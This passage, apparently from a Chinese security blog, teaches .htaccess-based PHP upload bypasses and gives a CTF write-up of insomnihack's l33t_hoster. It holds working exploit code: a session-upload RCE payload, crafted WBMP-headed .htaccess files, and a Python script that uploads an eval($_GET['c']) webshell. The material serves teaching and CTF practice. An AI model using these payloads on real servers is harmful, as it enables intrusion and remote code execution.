class="hljs-built_in">application</span>/x-httpd-php .wuwuphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</span></code></pre></div><h4 id="1-3-直接进行其他编码"><a href="#1-3-直接进行其他编码" class="headerlink" title="1.3 直接进行其他编码"></a>1.3 直接进行其他编码</h4><p>通过UTF-7、UTF-16等进行编码</p><p><a href="https://p1.ssl.qhimg.com/t01c5a05b61a6155478.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01c5a05b61a6155478.png" alt="img"></a></p><p>编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs stylus">AddType application/x-httpd-php .aaaphp_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre></div><p>之后将后缀<code>.aaa</code>文件的内容进行相应编码即可</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911104400025.png" alt="image-20200911104400025"></p><p>实际上文件包含会直接进行解码</p><p>不使用上述配置一样可行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911104751138.png" alt="image-20200911104751138"></p><h4 id="1-4-拼接无用字符"><a href="#1-4-拼接无用字符" class="headerlink" title="1.4 拼接无用字符"></a>1.4 拼接无用字符</h4><p>可以使用<code>#</code>来注释掉后面拼接的多余内容，<code>#</code>需要和前面的内容隔一个空格，并且<code>#</code>只能注释一行内容，可以使用反斜线来转义换行符，从而注释多行内容</p><p>例如下面这个.htaccess文件是可以生效的：</p><div class="hljs code-wrapper"><pre><code class="hljs livescript">AddT<span class="hljs-string">\</span>ype application/x-httpd-php .abc <span class="hljs-comment">#\</span>asdf <span class="hljs-string">\</span>asdf</code></pre></div><p>除了<code>#</code>外，**<code>0x00</code>**也可以当注释符，使用<code>write.php</code>脚本写入.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$data</span> = urldecode(<span class="hljs-string">&#x27;AddType application/x-httpd-php .abc%0a%00asdf&#x27;</span>);file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-variable">$data</span>);</code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911105518417.png" alt="image-20200911105518417"></p><h3 id="2-文件格式检测（绕过exif-imagetype）"><a href="#2-文件格式检测（绕过exif-imagetype）" class="headerlink" title="2. 文件格式检测（绕过exif_imagetype）"></a>2. 文件格式检测（绕过exif_imagetype）</h3><h4 id="2-1-使用XBM图像"><a href="#2-1-使用XBM图像" class="headerlink" title="2.1 使用XBM图像"></a>2.1 使用XBM图像</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 创建空白图像并添加文字</span><span class="hljs-variable">$im</span> = imagecreatetruecolor(<span class="hljs-number">120</span>, <span class="hljs-number">20</span>);<span class="hljs-variable">$text_color</span> = imagecolorallocate(<span class="hljs-variable">$im</span>, <span class="hljs-number">233</span>, <span class="hljs-number">14</span>, <span class="hljs-number">91</span>);imagestring(<span class="hljs-variable">$im</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>,  <span class="hljs-string">&#x27;A Simple Text String&#x27;</span>, <span class="hljs-variable">$text_color</span>);<span class="hljs-comment">// 保存图像</span>imagexbm(<span class="hljs-variable">$im</span>, <span class="hljs-string">&#x27;1.png&#x27;</span>);<span class="hljs-comment">// 释放内存</span>imagedestroy(<span class="hljs-variable">$im</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>(下面的<code>1_png_width</code>以及<code>1_png_height</code>是根据文件名进行拼接生成的)</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t018f3be6bcb8f72d0b.png" alt="img"></p><p>那么可以在.htaccess前面加上：</p><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> 1_png_width 120</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> 1_png_height 20</span></code></pre></div><p>便可绕过对文件格式的检测</p><h4 id="2-2-使用WBMP图像"><a href="#2-2-使用WBMP图像" class="headerlink" title="2.2 使用WBMP图像"></a>2.2 使用WBMP图像</h4><p>使用WBMP图像，使用PHP生成图像：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>);imagewbmp(<span class="hljs-variable">$img</span>, <span class="hljs-string">&#x27;1.wbmp&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>使用16进制编辑器查看：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t018eadaee755935c3a.png" alt="img"></p><p>可以看到这种图像格式是以<code>0x00</code>开头的，那么便可以此方式绕过对文件格式的检测</p><h3 id="3-session-文件包含"><a href="#3-session-文件包含" class="headerlink" title="3. session 文件包含"></a>3. session 文件包含</h3><p>若过滤了<code>&lt;</code>、数字、<code>:</code>等，此时便不能使用<code>php://filter</code>或者UTF编码的方式绕过了；可尝试利用.htaccess设置包含指定的文件。例如对于session文件，可通过包含上传文件产生的临时session进行RCE</p><p>查看配置文件，发现大部分session相关的配置都是可以通过.htaccess修改的：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0122f5df0960075c53.png" alt="img"></p><p>那么我们可以在不知道session存储路径的情况下，通过<code>session.save_path</code>指定存储路径，并且可以将<code>session.upload_progress.cleanup</code>设置为off，这样便可无需条件竞争来将代码写到session文件中，从而包含rce；编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">php_value auto_append_file &quot;/tmp/sess_gtfly&quot;php_value <span class="hljs-keyword">session</span>.save_path &quot;/tmp&quot;php_flag <span class="hljs-keyword">session</span>.upload_progress.cleanup <span class="hljs-keyword">off</span></code></pre></div><p>由于关掉了cleanup，所以不用竞争了</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&#x27;http://127.0.0.1/test.php&#x27;</span>headers=&#123;    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&#x27;PHPSESSID=gtfly&#x27;</span>&#125;files=&#123;    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;data=&#123;    <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?php echo system(&#x27;whoami&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>     &#125;r = requests.session()r.post(url,files=files,headers=headers,data=data)t = r.get(<span class="hljs-string">&#x27;http://127.0.0.1/test.php&#x27;</span>,headers=headers)print(t.text)</code></pre></div><h2 id="0x06-相关例题"><a href="#0x06-相关例题" class="headerlink" title="0x06 相关例题"></a>0x06 相关例题</h2><h3 id="insomnihack——l33t-hoster"><a href="#insomnihack——l33t-hoster" class="headerlink" title="insomnihack——l33t_hoster"></a><a href="https://github.com/eboda/insomnihack">insomnihack</a>——l33t_hoster</h3><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;source&quot;</span>]))     <span class="hljs-keyword">die</span>(highlight_file(<span class="hljs-keyword">__FILE__</span>));session_start();<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>])) &#123;    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class="hljs-number">20</span>));&#125;<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;images/<span class="hljs-subst">&#123;$_SESSION[&quot;home&quot;]&#125;</span>/&quot;</span>;<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;    mkdir(<span class="hljs-variable">$userdir</span>);&#125;<span class="hljs-variable">$disallowed_ext</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;php&quot;</span>,    <span class="hljs-string">&quot;php3&quot;</span>,    <span class="hljs-string">&quot;php4&quot;</span>,    <span class="hljs-string">&quot;php5&quot;</span>,    <span class="hljs-string">&quot;php7&quot;</span>,    <span class="hljs-string">&quot;pht&quot;</span>,    <span class="hljs-string">&quot;phtm&quot;</span>,    <span class="hljs-string">&quot;phtml&quot;</span>,    <span class="hljs-string">&quot;phar&quot;</span>,    <span class="hljs-string">&quot;phps&quot;</span>,);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;yuuuge fail&quot;</span>);    &#125;    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;        array_shift(<span class="hljs-variable">$parts</span>);    &#125;    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$parts</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol filename is empty&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$disallowed_ext</span>, <span class="hljs-literal">TRUE</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol nice try, but im not stupid dude...&quot;</span>);    &#125;    <span class="hljs-variable">$image</span> = file_get_contents(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$image</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;why would you need php in a pic.....&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not an image.&quot;</span>);    &#125;    <span class="hljs-variable">$image_size</span> = getimagesize(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);    &#125;    <span class="hljs-variable">$name</span> = implode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$parts</span>);    move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Your &lt;a href=<span class="hljs-subst">$userdir</span>&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;<span class="hljs-keyword">foreach</span>(glob(<span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;<span class="hljs-subst">$file</span>&#x27;&gt;<span class="hljs-subst">$file</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span>&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;?&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;image&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt;<span class="hljs-number">1</span></code></pre></div><ul><li><p>文件名必须要包含<code>.</code></p></li><li><p>设置了文件后缀黑名单<code>&quot;php&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;php7&quot;,&quot;pht&quot;,&quot;phtm&quot;,&quot;phtml&quot;,&quot;phar&quot;,&quot;phps&quot;</code>,黑名单非常完善。</p><ul><li>如果文件名是通过get或post获取的，可采用<code>php\n</code>的方式绕过</li><li>如果存在<code>.htaccess</code>可以通过上传<code>.htaccess</code>达到其他后缀的效果</li><li>如果获取文件后缀的方式有问题，可以通过<code>php/.</code> 方式绕过</li></ul></li><li><p>文件内容不能包含<code>&lt;?</code></p><ul><li><p>通过php小于7.0的可以通过<code>&lt;script lanague=&#39;php&#39;&gt;</code> 绕过</p></li><li><div class="hljs code-wrapper"><pre><code class="php">7.0.0   The ASP tags &lt;%, %&gt;, &lt;%=, and the script tag &lt;script language=&quot;php&quot;&gt; are removed from PHP.5.4.0   The tag &lt;?= is always available regardless of the short_open_tag ini setting.<pre><code class="hljs awk">  - 如果能够控制文件名开头可以通过伪协议绕过：`php:<span class="hljs-regexp">//</span>filter` 等- 文件要通过`exif_imagetype`的检查  - 只检查文件头- 图片的height和width要是<span class="hljs-number">1337</span>我们需要上传.htaccess但是如下代码会进行后缀提取```php    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);</code></pre></div></code></pre></li></ul></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190122212825-98708d30-1e49-1.png" alt="img"></p><p>但是后面的代码使得我们可以绕过</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;        array_shift(<span class="hljs-variable">$parts</span>);    &#125;</code></pre></div><p><strong>array_shift()</strong> 将 <code>array</code> 的第一个单元移出并作为结果返回，将 <code>array</code> 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。</p><p>filename 为..htaccess即可绕过</p><p>下一步是考虑.htaccess文件的内容</p><ul><li>exif_imagetype() 支持的magic number</li><li><code>AddType application/x-httpd-php .wuwu</code></li><li>还要能正确解析</li></ul><p>之前提到以0x00也是可以当做注释的。所以可以中找找以0x00开头的图片</p><p><a href="https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c">https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c</a></p><p>php源码中对于图片头的检查如下：</p><div class="hljs code-wrapper"><pre><code class="hljs c">PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_gif[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_psd[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_bmp[<span class="hljs-number">2</span>] = &#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_swf[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_swc[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jpg[<span class="hljs-number">3</span>] = &#123;(<span class="hljs-keyword">char</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0xd8</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0xff</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_png[<span class="hljs-number">8</span>] = &#123;(<span class="hljs-keyword">char</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x4e</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x47</span>,                                    (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x1a</span>, (<span class="hljs-keyword">char</span>) <span class="hljs-number">0x0a</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_tif_ii[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x2A</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_tif_mm[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x2A</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jpc[<span class="hljs-number">3</span>]  = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0xff</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x4f</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0xff</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_jp2[<span class="hljs-number">12</span>] = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0c</span>,                                     (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x50</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x20</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x20</span>,                                     (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x87</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x0a</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_iff[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_ico[<span class="hljs-number">4</span>] = &#123;(<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x01</span>, (<span class="hljs-keyword">char</span>)<span class="hljs-number">0x00</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_riff[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>&#125;;PHPAPI <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> php_sig_webp[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>&#125;;</code></pre></div><p>满足要求的有jp2和ico</p><p>但是ico的长度最多是0xff，为1337是0x539</p><p>jp2 只修改header不能改变getimagesize的结果</p><p>查询到wbmp图像可以</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200914084822368.png" alt="image-20200914084822368"></p><p>然后用此链接<a href="https://image.online-convert.com/convert-to-wbmp%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA1337*1337%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%9B%BE%E5%83%8F%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%A0%E9%99%A4%E5%8F%AA%E7%95%99%6000008A398A39%60">https://image.online-convert.com/convert-to-wbmp生成一个1337*1337大小的图像，然后删除只留`00008A398A39`</a> 这些即可满足type为wbmp长宽高为1337</p><div class="hljs code-wrapper"><pre><code class="hljs bash">root@drom-virtual-machine:/home/drom/图片<span class="hljs-comment"># xxd 11.wbmp  | head</span>00000000: 0000 8a39 8a39 ffff ffff ffff ffff ffff  ...9.9..........00000010: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000020: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000030: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000040: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000050: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000060: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................00000090: ffff ffff ffff ffff ffff ffff ffff ffff  ................</code></pre></div><p>文件头为0000 8a39 8a39，只留这部分即可</p><p>对于不能写&lt;?可以使用php://filter/covert.base64-decode/resource=shell.wuwu</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .wuwuphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/images/1222a98e5b5a6fd81ff8761be852e16e75b18703/shell.wuwu&quot;</span></code></pre></div><p>还需要考虑的是在base64decode后能够正常反序列化出语句。</p><div class="hljs code-wrapper"><pre><code class="hljs python">shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;\x39\x39&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span>)</code></pre></div><p>可以编码的字符为\x39，由于前面只有两个，而base64是4个一组，所以需要再填充两个字符，b”\x39\x39”</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url = <span class="hljs-string">&#x27;http://192.168.1.22:8000/index.php&#x27;</span>php_sessionID = <span class="hljs-string">&quot;tj3kr62k12a7nrj33evue8qkhq&quot;</span>Cookies = &#123;    <span class="hljs-string">&#x27;XDEBUG_SESSION&#x27;</span>:<span class="hljs-string">&#x27;XDEBUG_ECLIPSE&#x27;</span>,    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:php_sessionID&#125;file_content = <span class="hljs-string">b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39</span><span class="hljs-string">AddType application/x-httpd-php .wuwu</span><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/images/1222a98e5b5a6fd81ff8761be852e16e75b18703/shell.wuwu&quot;</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># php://filter/convert.base64-decode/resource=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu</span>data = &#123;    <span class="hljs-string">&#x27;upload&#x27;</span>:<span class="hljs-string">&#x27;submit&#x27;</span>&#125;shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;\x39\x39&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span>)normal = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span> + <span class="hljs-string">b&quot;&quot;</span>;files = &#123;    <span class="hljs-string">&#x27;image&#x27;</span>:(        <span class="hljs-string">&#x27;shell.wuwu&#x27;</span>,        shell,        <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>    )&#125;proxies = &#123;    <span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;s = requests.session()r = s.post(url,cookies=Cookies,data=data,files=files,proxies=proxies).textprint(r)<span class="hljs-comment"># images/295be839f519b2a6dac30e8e472ca45856fcb402/</span></code></pre></div><p>题目的后半段为绕过disable_function</p><h2 id="0x07-利用脚本"><a href="#0x07-利用脚本" class="headerlink" title="0x07 利用脚本"></a>0x07 利用脚本</h2><h3 id="通用上传-文件类型绕过脚本"><a href="#通用上传-文件类型绕过脚本" class="headerlink" title="通用上传+文件类型绕过脚本"></a>通用上传+文件类型绕过脚本</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url = <span class="hljs-string">&quot;http://35.246.234.136/?&quot;</span>header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=58eshi3a265dguf0icnkc6qk5a&quot;</span>&#125;<span class="hljs-comment">#这里是使用xxd查看的文件16进制</span>htaccess = <span class="hljs-string">b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39 </span><span class="hljs-string">AddType application/x-httpd-php .wuwu</span><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu&quot;</span><span class="hljs-string">&quot;&quot;&quot;</span>shell = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span>+<span class="hljs-string">b&quot;00&quot;</span>+ base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_GET[&#x27;c&#x27;]);?&gt;&quot;</span>)files = [(<span class="hljs-string">&#x27;image&#x27;</span>,(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]data = &#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;proxies = &#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;print(<span class="hljs-string">&quot;upload .htaccess&quot;</span>)r = requests.post(url=url, data=data, files=files,headers=header)<span class="hljs-comment">#proxies=proxies)</span><span class="hljs-comment"># print(r.text) </span>print(<span class="hljs-string">&quot;upload shell.wuwu&quot;</span>)files = [(<span class="hljs-string">&#x27;image&#x27;</span>,(<span class="hljs-string">&#x27;shell.wuwu&#x27;</span>,shell,<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]r = requests.post(url=url, data=data, files=files,headers=header)</code></pre></div><h3 id="php配置弱点检查脚本"><a href="#php配置弱点检查脚本" class="headerlink" title="php配置弱点检查脚本"></a>php配置弱点检查脚本</h3><ul><li><a href="https://github.com/sektioneins/pcc">pcc</a></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200913083448243.png" alt="image-20200913083448243"></p><h2 id="0x08-php安全加固"><a href="#0x08-php安全加固" class="headerlink" title="0x08 php安全加固"></a>0x08 